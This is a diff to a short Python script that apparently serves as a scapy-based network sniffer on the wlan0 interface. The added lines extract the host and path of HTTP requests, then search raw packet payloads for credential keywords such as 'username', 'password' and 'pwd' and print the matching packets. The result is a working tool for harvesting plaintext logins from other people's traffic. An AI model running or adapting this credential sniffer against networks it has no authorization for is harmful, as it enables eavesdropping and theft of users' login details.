@@ -10,8 +10,16 @@ def sniffer(interface):
 # This function would be called in the prn of the sniffer function and filter data i.e. from http websites
 def sniffed_packet(packets):
     if packets.haslayer(http.HTTPRequest): # This will check for http layer
+        url = packets[http.HTTPRequest].Host + packets[http.HTTPRequest].Path # capture host & path & then print it
+        print(url)
         if packets.haslayer(scapy.Raw): # This will check for if the packet has a raw layer
-            print(packets[scapy.Raw].load) # print the raw layer
+            loader = packets[scapy.Raw].load
+            # Creating wordlist to check for username and password fields and iterate each word in the for loop
+            wordlist = ["user", "uname", "usr", "username", "password", "pass", "pwd", "login", "lgn_Button"]
+            for key in wordlist:
+                if key in loader: # if the key is found in the loader variable, print the statement once
+                    print(loader)
+                    break
 
 # Capturing data from wlan0 interface
 sniffer("wlan0")
